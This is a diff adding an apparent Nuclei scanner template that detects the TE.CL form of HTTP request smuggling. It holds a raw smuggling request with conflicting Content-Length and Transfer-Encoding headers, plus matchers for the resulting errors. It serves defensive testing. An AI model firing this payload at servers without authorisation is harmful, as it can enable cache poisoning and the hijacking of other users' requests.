@@ -1,0 +1,64 @@
+id: http-request-smuggling-tecl
+
+info:
+  name: HTTP Request Smuggling - TE.CL
+  author: FaizanAnwar01
+  severity: medium
+  description: |
+    The server may be vulnerable to HTTP Request Smuggling (TE.CL variant).
+    The front-end server uses the Transfer-Encoding header while the back-end
+    server uses the Content-Length header. An attacker can craft a chunked request
+    where the back-end reads only Content-Length bytes, treating the remainder as
+    the beginning of the next request. This can lead to cache poisoning, bypassing
+    security controls, or hijacking other users' requests.
+  reference:
+    - https://portswigger.net/web-security/request-smuggling
+    - https://cwe.mitre.org/data/definitions/444.html
+    - https://hackerone.com/reports/215170
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-444
+  metadata:
+    verified: true
+    max-request: 1
+  tags: http,smuggling,tecl,misconfig
+
+http:
+  - raw:
+      - |+
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 4
+        Transfer-Encoding: chunked
+
+        56
+        GPOST / HTTP/1.1
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 6
+
+        0
+
+
+    unsafe: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Unrecognized method GPOST"
+          - "Not Implemented"
+          - "Method Not Allowed"
+          - "Invalid method"
+          - "Unknown HTTP method"
+          - "501 GPOST"
+        condition: or
+
+      - type: status
+        status:
+          - 400
+          - 405
+          - 501
+        condition: or
